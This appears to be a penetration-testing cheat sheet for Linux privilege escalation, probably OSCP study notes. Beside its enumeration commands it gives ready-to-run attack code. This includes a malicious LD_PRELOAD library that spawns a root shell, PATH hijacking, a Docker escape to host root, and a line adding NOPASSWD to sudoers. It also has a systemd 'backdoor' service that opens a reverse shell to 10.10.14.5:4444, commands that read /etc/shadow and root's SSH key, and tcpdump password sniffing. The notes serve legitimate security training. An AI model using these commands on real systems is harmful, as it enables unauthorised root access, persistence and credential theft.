# Stabilize Shell
We often land with an unstable shell that makes further enumeration more difficult, so we should address it first.

## Python Shell Stabilizer (1/2)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Press CTRL+Z** to background the process, then run:
## Python Shell Stabilizer (2/2)
```bash
stty raw -echo; fg; export TERM=xterm
```

## Check current user and group memberships
```bash
id
```

## List all system users
```bash
cat /etc/passwd
```
Is /etc/passwd writable? Create a new user or remote the 'x' from an existing user to effectively remove their password.

## Display hostname
```bash
hostname
```

## Linux OS distribution and version
```bash
cat /etc/issue
cat /etc/os-release
uname -a
cat /proc/version
lsb_release -a
```

## List all running processes
```bash
ps aux
```

## Monitor processes with pspy (Source)
```
https://github.com/DominicBreuker/pspy
```
Transfer to target and run.
Use `timeout 20 ./pspy64` to end after 20 seconds (otherwise can only exit with CTRL+C which will kill most reverse shells)

## Watch for password-related processes
```bash
watch -n 1 "ps -aux | grep pass"
```

## Display network interfaces and IP addresses
```bash
ip a
```

## Show routing table
```bash
ip route
```

## List all network connections and listening ports
```bash
ss -antup
```

## Check iptables firewall rules
```bash
ls -la /etc/iptables
iptables -L -n -v
iptables-save
```

## Capture network traffic for credentials
```bash
tcpdump -i lo -A | grep "pass"
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

## List all cron job files
```bash
ls -lah /etc/cron*
```

## Display system-wide crontab
```bash
cat /etc/crontab
```

## List current user's cron jobs
```bash
crontab -l
sudo crontab -l
```

## List cron jobs for all users
```bash
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done
```

## List installed packages on Debian-based systems
```bash
dpkg -l
apt list --installed
```

## List installed packages on RedHat-based systems
```bash
rpm -qa
yum list installed
```

# Credential Hunting
https://osintteam.blog/oscp-exam-success-10-must-know-commands-and-tools-every-pentester-should-master-4b514bf64ccd

## Look in /, /opt, /tmp, /var for unusual files

## grep /etc for "password"
```
grep -rni 'password' /etc 2>/dev/null
```

## grep for Private Keys
```
grep -rni 'PRIVATE KEY' /home 2>/dev/null
```

## grep webroot for "password"
```
grep -Horn password /var/www
```

## grep Credential Hunt /etc
```
grep -rni --color=always 'password\|secret\|key\|token' /etc 2>/dev/null
```

## Find .bak,.zip,.tar.gz Backups and Archives
Use zip2john and crack if applicable.
```
find / -regextype posix-egrep -regex ".*\.(bak|zip|tar|gz)$"
```
``

## Find nonempty directories
Automated tools may miss unusual directories. Same time when `tree` isn't available.
```
find . -type d ! -empty
```

## Find all writable directories
```bash
#find / -perm -222 -type d 2>/dev/null
#find / -perm -o w -type d 2>/dev/null
find / -writable -type d 2>/dev/null
```

## Find all SUID files
```bash
find / -perm -u=s -type f 2>/dev/null
```

## Find all SGID files
```bash
find / -perm -g=s -type f 2>/dev/null
```

## Find files with capabilities set
```bash
getcap -r / 2>/dev/null
```

## Display filesystem mount table
```bash
cat /etc/fstab
```

## Show currently mounted filesystems
```bash
mount
df -h
```

## List block devices
```bash
lsblk
```

## List loaded kernel modules
```bash
lsmod
/sbin/modinfo <module_name>
```

## Display environment variables and PATH
```bash
echo $PATH
env
printenv
cat /etc/environment
cat /etc/profile
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_profile
```

## Run unix-privesc-check for automated enumeration
```bash
unix-privesc-check standard > output.txt
unix-privesc-check detailed > output.txt
```


## LinPEAS (Kali Source)
```
/usr/share/peass/linpeas/linpeas.sh
```
on kali. Transfer to target and tee to output file.

## Download and run LinEnum

```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

## Download and run Linux Exploit Suggester
```bash
curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

## Check sudo permissions
Check gtfobins for interesting entries.
```bash
sudo -l
```

## Exploit PATH hijacking with writable directory
```bash
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

## Check for LD_PRELOAD sudo permission
```bash
sudo -l | grep LD_PRELOAD
```

## Create malicious shared library for LD_PRELOAD exploit
```bash
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so apache2
```

## Check bash history for credentials
```bash
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history
cat ~/.vim_history
find /home -name ".*history" 2>/dev/null
```

## Escape Docker container to host root
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run --rm -v /etc:/mnt/etc -it alpine vi /mnt/etc/passwd
```

## Access MySQL as root and execute shell
```bash
mysql -u root -p
\! /bin/bash
```

## Check for MySQL UDF exploits
```bash
searchsploit mysql udf
searchsploit -m 1518
```

## Add user to sudoers file
```bash
echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

## Create systemd backdoor service
```bash
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
systemctl start backdoor.service
```

## Search for readable sensitive files
```bash
cat /etc/shadow 2>/dev/null
cat /etc/sudoers 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
```

## Check common application config locations
```bash
cat /var/www/html/config.php 2>/dev/null
ls -la /etc/apache2/sites-enabled/
ls -la /etc/nginx/sites-enabled/
find /opt -name "*.conf" 2>/dev/null
```

---

## Methodology

### Initial Access Strategy
Always create backup shells immediately after initial access:
1. Get initial shell via web exploit
2. Immediately create second shell via different method
3. Upgrade shells and maintain multiple access points

### Enumeration Priority
1. Run automated tools first (LinPEAS, LinEnum)
2. Check sudo permissions
3. Search for SUID/SGID binaries
4. Hunt for credentials in configs and history
5. Check for writable files and directories
6. Enumerate running processes and cron jobs

### Common Privilege Escalation Vectors

**High Priority:**
- [ ] Sudo misconfigurations (NOPASSWD, wildcards, etc.)
- [ ] SUID/SGID binaries (check GTFOBins)
- [ ] Writable /etc/passwd or /etc/shadow
- [ ] Docker group membership
- [ ] Writable cron jobs or scripts

**Medium Priority:**
- [ ] PATH hijacking opportunities
- [ ] LD_PRELOAD abuse
- [ ] Capabilities on binaries
- [ ] Writable service files
- [ ] Database running as root

**Low Priority (Last Resort):**
- [ ] Kernel exploits (risk of system crash)

### GTFOBins Reference
When you find SUID binaries or sudo permissions, always check 
- https://gtfobins.github.io/#+suid
- https://gtfobins.github.io/#+sudo
- https://gtfobins.github.io/#+capabilities

### Sensitive Files Checklist
- [ ] /etc/passwd (writable?)
- [ ] /etc/shadow (readable?)
- [ ] /etc/group
- [ ] /etc/sudoers
- [ ] /etc/crontab
- [ ] /var/log/auth.log
- [ ] /var/log/secure
- [ ] /home/*/.ssh/
- [ ] /root/.ssh/
- [ ] /var/www/html/config.php
- [ ] Application configs in /opt and /usr/local

### Resources
- GTFOBins: https://gtfobins.github.io/
- HackTricks Linux PrivEsc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
- OSCP Secret Sauce (pspy process monitoring): https://eins.li/posts/oscp-secret-sauce/
